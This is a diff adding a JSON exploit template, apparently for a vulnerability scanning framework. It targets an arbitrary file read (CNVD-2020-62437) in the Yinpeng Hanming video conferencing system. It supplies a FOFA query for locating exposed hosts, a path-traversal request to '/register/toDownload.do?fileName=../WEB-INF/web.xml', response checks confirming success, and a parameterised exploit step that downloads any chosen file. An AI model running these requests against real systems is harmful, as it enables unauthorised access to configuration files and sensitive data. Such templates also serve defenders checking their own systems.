@@ -1,0 +1,141 @@
+{
+  "Name": "Yinpeng Hanming Video Conferencing Arbitrary file read (CNVD-2020-62437)",
+  "Description": "There is an arbitrary file download vulnerability in haoshitong video conference system of Shenzhen yinpeng cloud computing Co., Ltd., which can be used by attackers to obtain sensitive information.",
+  "Product": "Yinpeng Hanming Video Conferencing",
+  "Homepage": "http://zhibo.hst.com/",
+  "DisclosureDate": "2020-12-11",
+  "Author": "ovi3",
+  "FofaQuery": "app=\"Hanming-Video-Conferencing\"",
+  "Level": "2",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "https://www.cnvd.org.cn/flaw/show/CNVD-2020-62437",
+	"https://github.com/PeiQi0/PeiQi-WIKI-POC"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+       "name": "filepath",
+       "type": "input",
+       "value": "../WEB-INF/web.xml"
+	}
+  ],
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/register/toDownload.do?fileName=../WEB-INF/web.xml"
+      },
+      "ResponseTest": {
+        "operation": "AND",
+        "type": "group",
+        "checks": [
+		  {
+			"type": "item",
+			"variable": "$code",
+			"operation": "==",
+			"value": "200",
+			"bz": ""
+		  },
+		  {
+			"type": "item",
+			"variable": "$body",
+			"operation": "contains",
+			"value": "<welcome-file>/WEB-INF/pages/other/toLogin.jsp</welcome-file>",
+			"bz": ""
+		  },
+		  {
+			"type": "item",
+			"variable": "$body",
+			"operation": "contains",
+			"value": "<web-app ",
+			"bz": ""
+		  }
+		]
+      }
+    }
+  ],
+  "ExploitSteps": [
+	"AND",
+	{
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/register/toDownload.do?fileName=../WEB-INF/web.xml"
+      },
+      "ResponseTest": {
+        "operation": "AND",
+        "type": "group",
+        "checks": [
+		  {
+			"type": "item",
+			"variable": "$code",
+			"operation": "==",
+			"value": "200",
+			"bz": ""
+		  },
+		  {
+			"type": "item",
+			"variable": "$body",
+			"operation": "contains",
+			"value": "<welcome-file>/WEB-INF/pages/other/toLogin.jsp</welcome-file>",
+			"bz": ""
+		  },
+		  {
+			"type": "item",
+			"variable": "$body",
+			"operation": "contains",
+			"value": "<web-app ",
+			"bz": ""
+		  }
+		]
+      },
+	  "SetVariable": [
+		"output|lastbody"
+	  ]
+    },
+	{
+	  "Request": {
+		"method": "GET",
+		"uri": "/register/toDownload.do?fileName={{{filepath}}}",
+		"follow_redirect": true,
+		"header": {},
+		"data_type": "text",
+		"data": ""
+	  },
+	  "ResponseTest": {
+		"type": "group",
+		"operation": "AND",
+		"checks": [
+		  {
+			"type": "item",
+			"variable": "$code",
+			"operation": "==",
+			"value": "200",
+			"bz": ""
+		  }
+		]
+	  },
+	  "SetVariable": [
+		"output|lastbody"
+	  ]
+	}
+  ],
+  "Tags": null,
+  "CVEIDs": null,
+  "CVSSScore": "9.3",
+  "AttackSurfaces": {
+    "Application": ["Hanming-Video-Conferencing"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
